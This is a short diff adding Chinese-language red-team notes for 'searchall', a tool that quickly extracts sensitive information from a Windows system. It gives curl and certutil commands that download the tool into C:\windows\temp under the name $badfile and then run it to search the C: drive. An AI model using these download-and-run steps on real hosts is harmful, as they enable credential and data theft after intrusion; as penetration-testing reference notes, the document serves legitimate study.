@@ -1,0 +1,11 @@
+>项目地址：https://github.com/Naturehi666/searchall/releases/tag/search3.5.11
+>curl下载
+cd C:\windows\temp && curl $downloadurl -O
+>certutil下载
+certutil -urlcache -split -f $downloadurl C:\windows\temp\$badfile
+>使用，可以自己指定目录，自行修改-p参数
+C:\windows\temp\$badfile search -p c:\\
+
+###
+一个帮助快速从系统内提取敏感信息的工具
+###
